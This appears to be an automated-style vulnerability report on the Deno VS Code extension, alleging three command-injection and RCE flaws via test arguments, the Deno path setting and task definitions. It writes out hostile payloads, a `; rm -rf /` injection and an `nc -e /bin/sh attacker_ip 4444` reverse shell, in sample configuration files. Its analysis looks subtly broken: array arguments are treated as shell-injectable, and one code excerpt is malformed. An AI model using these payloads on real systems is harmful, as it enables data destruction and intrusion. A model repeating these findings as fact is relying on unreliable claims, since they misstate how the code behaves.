# Vulnerability List

## 1. Command Injection via Test Configuration Arguments
**Vulnerability Name:** Command Injection via Test Configuration Arguments
**Description:**
The extension allows users to configure test arguments through the `deno.codeLens.testArgs` setting. These arguments are directly passed to the Deno CLI without proper validation or sanitization. An attacker can manipulate a malicious repository's configuration to include malicious arguments (e.g., `"; rm -rf /`), leading to command injection. When the user runs tests, the Deno CLI executes the injected command, resulting in arbitrary code execution.

**Step-by-Step Trigger:**
1. An attacker provides a malicious repository with a `settings.json` or `.vscode/settings.json` file containing:
   ```json
   {
     "deno.codeLens.testArgs": ["--allow-all", "; rm -rf /"]
   }
   ```
2. The user opens the repository in VSCode and enables Deno via the extension.
3. The attacker tricks the user into running a test via the "Run Test" code lens or debug configuration.
4. The malicious command (e.g., `rm -rf /`) executes in the background due to improper sanitization of `testArgs`.

**Impact:**
Critical. Attackers can execute arbitrary commands with the user’s privileges, leading to data destruction or system compromise.

**Vulnerability Rank:** Critical
**Currently Implemented Mitigations:** None. The `testArgs` are directly concatenated into the command line.
**Missing Mitigations:** Lack of input validation/sanitization for `testArgs`.
**Preconditions:**
- User opens a malicious repository with a configured `deno.codeLens.testArgs`.
- The user runs a test via the extension's UI.

**Source Code Analysis:**
- **File:** `client/src/commands.ts`
  - The `test` function constructs the Deno CLI command using `testArgs`:
    ```typescript
    const testArgs: string[] = [
      ...(config.get<string[]>("codeLens.testArgs") ?? []),
    ];
    ```
  - These args are directly passed to the `deno test` command without validation:
    ```typescript
    const args = ["test", ...testArgs, "--filter", nameRegex, filePath];
    ```

- **File:** `client/src/debug_config_provider.ts`
  - The debug configuration uses user-provided `runtimeArgs` without validation:
    ```typescript
    runtimeArgs: [
      "run",
      ...this.#getAdditionalRuntimeArgs(),
      this.#getInspectArg(),
      "--allow-all",
    ],
    ```

**Security Test Case:**
1. Create a malicious repository with a `.vscode/settings.json` containing malicious `testArgs`.
2. Open the repository in VSCode with the Deno extension enabled.
3. Add a test file (e.g., `test.ts`) and trigger the test via the code lens.
4. Observe the malicious command execution (e.g., a file deletion or system command).

---

## 2. RCE via User-Controlled Deno Path
**Vulnerability Name:** RCE via User-Controlled Deno Path
**Description:**
The extension allows users to specify the Deno executable path via the `deno.path` setting. If this path is manipulated to point to a malicious script (e.g., `deno_malicious.sh`), the extension will execute it when starting the language server, leading to remote code execution.

**Step-by-Step Trigger:**
1. An attacker provides a malicious repository with a `settings.json` or `.vscode/settings.json` file containing:
   ```json
   {
     "deno.path": "/path/to/attacker-controlled/deno.sh"
   }
   ```
2. The malicious script (`deno.sh`) contains arbitrary commands (e.g., `echo "Attacker owns this machine" > /tmp/exploit`).
3. The user opens the repository in VSCode.
4. The extension starts the Deno language server using the malicious path, executing the attacker’s script.

**Impact:**
Critical. The attacker gains control over the user’s system via the malicious Deno executable.

**Vulnerability Rank:** Critical
**Currently Implemented Mitigations:** None. The path is directly used without validation.
**Missing Mitigations:** Lack of validation for the `deno.path` to ensure it points to an official Deno binary.
**Preconditions:**
- User opens a malicious repository with a configured `deno.path`.

**Source Code Analysis:**
- **File:** `client/src/util.ts`
  - `getDenoCommandPath` uses the user-provided `deno.path` directly:
    ```typescript
    const command = getWorkspaceConfigDenoExePath();
    // ... executed without validation
    ```

- **File:** `client/src/extension.ts`
  - The language server is started using the unvalidated `command`:
    ```typescript
    const serverOptions: ServerOptions = {
      run: {
        command,
        args: ["lsp"],
        options: { env },
      },
    };
    ```

**Security Test Case:**
1. Create a malicious repository with `deno.path` pointing to a script that writes a file.
2. Open the repository in VSCode with the Deno extension.
3. Observe the creation of the file (e.g., `/tmp/exploit`) due to the malicious Deno executable executing.

---

## 3. Command Injection via Task Definitions
**Vulnerability Name:** Command Injection via Task Definitions
**Description:**
The extension allows users to define custom Deno tasks in JSON configuration files (e.g., `tasks.json`). These tasks include user-specified command-line arguments and environments. If an attacker manipulates a malicious repository’s task definitions to include malicious arguments/environments, the extension will execute them verbatim, leading to command injection.

**Step-by-Step Trigger:**
1. An attacker creates a malicious repository with a `tasks.json` in `.vscode/`:
   ```json
   {
     "type": "deno",
     "command": "run",
     "args": ["--allow-all", "malicious.ts", "; nc -e /bin/sh attacker_ip 4444"]
   }
   ```
2. The user opens the repository and executes the task via the tasks panel.
3. The malicious command (e.g., reverse shell) executes due to unsanitized `args`.

**Impact:**
High. Attackers can execute arbitrary commands via crafted task definitions.

**Vulnerability Rank:** High
**Currently Implemented Mitigations:** None. The `args` and `env` are directly used.
**Missing Mitigations:** Lack of validation/sanitization for task arguments and environment variables.
**Preconditions:**
- User runs a task defined in a malicious repository’s `tasks.json`.

**Source Code Analysis:**
- **File:** `client/src/tasks.ts`
  - The `buildDenoTask` function constructs commands using user-provided `args`:
    ```typescript
    const args = [definition.command].concat(definition.args ?? []);
    // ... passed directly to the ProcessExecution
    ```

- **File:** `client/src/tasks_sidebar.ts`
  - Task definitions are parsed and executed without validation:
    ```typescript
    const task = buildDenoConfigTask(
      (workspaceFolder, process, configTask.name, configTask.command ?? configTask.detail, Uri.parse(configTask.sourceUri));
    ```

**Security Test Case:**
1. Create a malicious repository with a `tasks.json` containing a task with malicious `args`.
2. Open the repository in VSCode and execute the task.
3. Observe the malicious command execution (e.g., a reverse shell connection).

---

**Summary Table**
| Vulnerability Name                                | Rank   | Class              | Impact                                                                 |
|--------------------------------------------------|--------|--------------------|-------------------------------------------------------------------------|
| Command Injection via Test Configuration Arguments | Critical | Command Injection | Arbitrary command execution with user privileges (e.g., file deletion, reverse shells) |
| RCE via User-Controlled Deno Path                 | Critical | RCE             | Execution of arbitrary code via a malicious Deno binary                          |
| Command Injection via Task Definitions           | High    | Command Injection | Arbitrary command execution via task configurations                            |

This list includes only valid, unmitigated vulnerabilities of RCE/Command/Code Injection classes ranked High or higher, excluding DoS or documentation-only issues. All entries meet the criteria specified.
